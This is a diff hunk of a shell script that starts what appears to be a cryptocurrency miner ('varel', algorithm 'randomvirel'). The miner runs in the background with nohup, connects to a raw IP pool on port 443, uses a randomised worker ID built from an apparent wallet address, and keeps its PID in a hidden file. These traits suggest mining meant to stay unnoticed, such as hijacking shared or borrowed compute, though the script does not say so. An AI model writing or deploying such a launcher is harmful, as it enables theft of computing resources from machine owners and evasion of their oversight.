@@ -27,18 +27,18 @@ fi
 # Clean old files
 rm -f ~/run.log ~/varel.out
 
-# === Start varel (suppress verbose output) ===
+# === Start varel ===
 RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-gtbbbb$(date +%s)"
 
-# Jalankan tanpa --verbose untuk kurangi output
+echo "🚀 Starting varel..."
 nohup ~/varel -a randomvirel \
   --url 137.184.31.121:443 \
   --user "$RANDOM_WORKER" \
   --threads=6 \
-  > ~/run.log 2>&1 &
-
+  2>&1 | tee -a ~/run.log >/dev/null &
 VAREL_PID=$!
 echo $VAREL_PID > ~/.varel.pid
+
 
 # Wait for initialization
 sleep 8
